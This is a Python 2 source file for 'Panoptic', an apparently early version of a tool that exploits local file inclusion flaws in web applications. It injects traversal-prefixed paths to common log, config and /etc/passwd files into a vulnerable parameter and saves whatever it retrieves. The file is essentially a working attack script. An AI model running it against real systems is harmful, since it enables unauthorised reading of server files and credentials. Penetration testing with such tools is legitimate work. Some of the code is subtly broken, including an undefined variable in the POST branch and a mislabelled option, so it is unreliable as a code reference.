#!/usr/bin/env python

"""
Panoptic

Search default file locations through LFI for common log and config files
"""

import difflib
import os
import random
import re
import string
import time

from urllib import urlencode
from urllib2 import urlopen, Request
from urlparse import urlsplit, parse_qsl
from optparse import OptionParser
from sys import argv, exit

NAME = "Panoptic"
VERSION = "v0.1"
URL = "https://github.com/lightos/Panoptic/"

# Used for retrieving response for a dummy filename
INVALID_FILENAME = "".join(random.sample(string.letters, 10))

# Used for heuristic comparison of responses
HEURISTIC_RATIO = 0.9

# ASCII eye taken from http://www.retrojunkie.com/asciiart/health/eyes.htm
BANNER = """
 .-',--.`-.
<_ | () | _>
  `-`=='-'

%s %s (%s)
""" % (NAME, VERSION, URL)

EXAMPLES = """
Examples:
./panoptic.py --url "http://localhost/lfi.php?file=test.txt"
./panoptic.py --url "http://localhost/lfi.php?file=test.txt&id=1" --param file
./panoptic.py --url "http://localhost/lfi.php" --data "file=test.txt&id=1" --param file

./panoptic.py --list software
./panoptic.py --list category
./panoptic.py --list os

./panoptic.py -u "http://localhost/lfi.php?file=test.txt" --os Windows
./panoptic.py -u "http://localhost/lfi.php?file=test.txt" --software WAMP
"""


class Panoptic:
    """
    Contains all the functionality to run Panoptic
    """

    def __init__(self):
        """
        Initiates the Panoptic object
        """

        self.software = ""
        self.category = ""
        self.classification = ""
        self.operating_system = ""
        self.file_found = False
        self.file_attributes = {}
    
    @staticmethod
    def list_items(item):
        """
        Returns available types of categories, software or operating systems
        """

        if item == "os":
            tmp = []
            print("Listing all available Operating Systems...\n")
        elif item == "category":
            print("Listing all available categories of software...\n")
        elif item == "software":
            print("Listing all available types of software...\n")
        else:
            print("[!] --list must be \"os\", \"software\" or \"category\"")
            exit()
        
        for file_location in open("file_locations.txt"):
            file_location = file_location.rstrip()

            if not file_location:
                continue

            if item == "category" and file_location[0] == "[":
                print("[+] %s" % file_location[1:-1])
            elif item == "software" and file_location[0] == "#":
                print("[+] %s" % file_location[2:])
            elif item == "os" and file_location[0] == "(":
                if file_location[1:-1] not in tmp:
                    tmp.append(file_location[1:-1])
                    
        if item == "os":
            for _ in tmp:
                print("[+] %s" % _)
                
        exit()
            
    def parse_file(self):
        """
        Parses the file locations list
        """

        for file_location in open("file_locations.txt"):
            if file_location[0] == "\n":
                self.software = ""
                self.classification = ""
                self.operating_system = ""
                self.file_attributes = {}
                continue

            file_location = file_location.rstrip()

            if file_location[0] == "[":
                self.category = file_location[1:-1]
                continue
            elif file_location[0] == "(":
                self.operating_system = file_location[1:-1]
                continue
            elif file_location[0] == "#":
                self.software = file_location[2:]
                continue
            elif file_location[0] == "*":
                self.classification = file_location[1:]
                continue
            elif file_location.find("{") != -1:
                # HANDLE HOST/DOMAIN replacement
                continue
            
            if self.args.software:
                if self.software.lower() != self.args.software.lower():
                    continue

            if self.args.category:
                if self.category.lower() != self.args.category.lower():
                    continue

            if self.args.classification:
                if self.classification.lower() not in [self.args.classification.lower(), "other"]:
                    continue

            if self.args.os:
                if self.operating_system.lower() != self.args.os.lower():
                    continue

            self.file_attributes["location"] = file_location
            self.file_attributes["software"] = self.software
            self.file_attributes["category"] = self.category
            self.file_attributes["classification"] = self.classification
            
            yield self.file_attributes
    
    def get_args(self):
        """
        Parses command line arguments
        """

        OptionParser.format_epilog = lambda self, formatter: self.epilog  # Override epilog formatting

        parser = OptionParser(usage="usage: %prog --url TARGET [options]", epilog=EXAMPLES)
        
        # Required
        parser.add_option("-u", "--url", dest="target",
                  help="set the target to test")
        # Optional
        parser.add_option("-p", "--param", dest="param",
                  help="set parameter name to test for")
        parser.add_option("-d", "--data", dest="data",
                  help="set data for POST request")
        parser.add_option("-y", "--proxy", dest="proxy",
                  help="set IP:PORT to use as socks proxy")
        parser.add_option("-o", "--os", dest="os",
                  help="set operating system to limit searches to")
        parser.add_option("-s", "--software", dest="software",
                  help="set name of the software to search for")
        parser.add_option("-c", "--category", dest="category",
                  help="set specific category of software to look for")
        parser.add_option("-t", "--type", dest="classification",
                  help="set type of file to search for (\"conf\" or \"log\")")
        parser.add_option("-b", "--prefix", dest="prefix", default="",
                  help="set prefix for file path (e.g. \"../\")")
        parser.add_option("-e", "--postfix", dest="postfix", default="",
                  help="set prefix for file path (e.g. \"%00\")")
        parser.add_option("-m", "--multiplier", dest="multiplier", type="int", default=1,
                  help="set number to multiply the prefix by")
        parser.add_option("-w", "--write-file", dest="write_file", action="store_true",
                  help="write all found files to output folder")
        parser.add_option("-x", "--skip-passwd-test", dest="skip_passwd", action="store_true",
                  help="skip special tests if *NIX passwd file is found")
        parser.add_option("-l", "--list",
                  help="list available filters (\"os\", \"category\", \"software\")")
        parser.add_option("-v", "--verbose", action="store_true", dest="verbose",
                  help="display extra information in the output")

        self.args = parser.parse_args()[0]

        if not self.args.target:
            parser.error('missing argument for url. Use -h for help')
            
        if self.args.prefix:
            self.args.prefix = self.args.prefix * self.args.multiplier

def main():
    """
    Initializes and executes the program
    """

    print(BANNER)

    panoptic = Panoptic()
    panoptic.get_args()

    print("[i] Starting scan at: %s\n" % time.strftime("%X"))

    parsed_url = urlsplit(panoptic.args.target)
    request_params = panoptic.args.data if panoptic.args.data else parsed_url.query
    
    if not panoptic.args.param:
        panoptic.args.param = re.match("(?P<param>[^=&]+)={1}(?P<value>[^=&]+)", request_params).group(1)

    def prepare_request(payload):
        """
        Prepares HTTP (GET or POST) request with proper payload
        """

        armed_query = re.sub(r"(?P<param>%s)={1}(?P<value>[^=&]+)" % panoptic.args.param,
                                r"\1=%s" % payload, request_params)
        request_args = {"target": "%s://%s%s" % (parsed_url.scheme, parsed_url.netloc, parsed_url.path)}

        if panoptic.args.data:
            request_args["data"] = armed_request
        else:
            request_args["target"] += "?%s" % armed_query
            
        return request_args

    def clean_response(response, filepath):
        """
        Cleans response from occurrences of filepath
        """

        response = response.replace(filepath, "")
        regex = re.sub(r"[^A-Za-z0-9]", "(.|&\w+;|%[0-9A-Fa-f]{2})", filepath)
        return re.sub(regex, "", response, re.I)

    print("[*] Checking invalid response...")

    request_args = prepare_request(INVALID_FILENAME)
    panoptic.invalid_response, _ = get_page(**request_args)

    print("[*] Done!\n")
    print("[*] Initiating file search...")

    for case in panoptic.parse_file():
        if panoptic.args.prefix and panoptic.args.prefix[len(panoptic.args.prefix) - 1] == "/":
            panoptic.args.prefix = panoptic.args.prefix[:-1]

        request_args = prepare_request("%s%s%s" % (panoptic.args.prefix, case["location"], panoptic.args.postfix))
        html, _ = get_page(**request_args)

        matcher = difflib.SequenceMatcher(None, clean_response(html, case["location"]), clean_response(panoptic.invalid_response, INVALID_FILENAME))

        if matcher.quick_ratio() < HEURISTIC_RATIO:
            if not panoptic.file_found:
                panoptic.file_found = True

                print("[*] Possible file(s) found!\n")

                if panoptic.operating_system:
                    print("[*] OS: %s\n" % panoptic.operating_system)

            print("[+] File: %s" % panoptic.file_attributes)

            # If --write-file is set.
            if panoptic.args.write_file:
                _ = os.path.join("output", parsed_url.netloc)
                if not os.path.exists(_):
                    os.makedirs(_)
                with open(os.path.join(_, "%s.txt" % case["location"].replace("/", "_")), "w") as f:
                    f.write(html)

            # If --skip-passwd-test not set.
            #if case["location"] in ("/etc/passwd", "/etc/security/passwd") and not panoptic.args.skip_passwd:
            #    users = re.findall("(?P<username>[^:\n]+):(?P<password>[^:]*):(?P<uid>\d+):(?P<gid>\d*):(?P<info>[^:]*):(?P<home>[^:]+):[/a-z]*", html)
            #    for user in users:
            #        username, password, uid, gid, info, home = user

    if not panoptic.file_found:
        print("[*] No files found!")

    print("\n[*] File search complete.")
    print("\n[i] Finishing scan at: %s\n" % time.strftime("%X"))
    
def get_page(**kwargs):
        """
        Retrieves page content from a given target URL
        """

        url = kwargs.get("target", None)
        post = kwargs.get("data", None)
        header = kwargs.get("header", None)
        cookie = kwargs.get("cookie", None)
        proxy = kwargs.get("proxy", False)
        user_agent = kwargs.get("user_agent", None)
        verbose = kwargs.get("verbose", False)

        parsed_url = None
        page = None

        if url is None:
            raise Exception("[!] URL cannot be None.")

        try:
            parsed_url = urlsplit(url)
        except:
            raise Exception("[!] Unable to parse URL: %s" % url)

        if proxy:
            import socket
            import thirdparty.socks.socks

            proxy = proxy.split(':')
            ip = proxy[0]
            port = proxy[1]
            socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, ip, int(port), True)
            socket.socket = socks.socksocket

        if user_agent is None:
            user_agent = {"user-agent": "%s %s" % (NAME, VERSION)}
        
        if post is None:
            url = "%s://%s%s?%s" % (parsed_url.scheme, parsed_url.netloc, parsed_url.path,
                                    urlencode(parse_qsl(parsed_url.query)))
        else:
            post = urlencode(parse_qsl(post), "POST")

        # Perform HTTP Request
        try:
            headers = user_agent
            headers["Accept"] = "*"  # Set option to add headers in cmdline

            req = Request(url, post, headers)
            conn = urlopen(req)

            # Get HTTP Response
            page = conn.read()
            code = conn.code
            status = conn.msg
            responseHeaders = conn.info()

        except IOError, e:
            if hasattr(e, "reason"):
                if verbose:
                    print("[!] Error msg: %d" % e.msg)
                    print("[!] HTTP error code: %d" % e.code)
                    print("[!] Response headers: %d" % e.info())
        
        return page, parsed_url

if __name__ == "__main__":
    main()
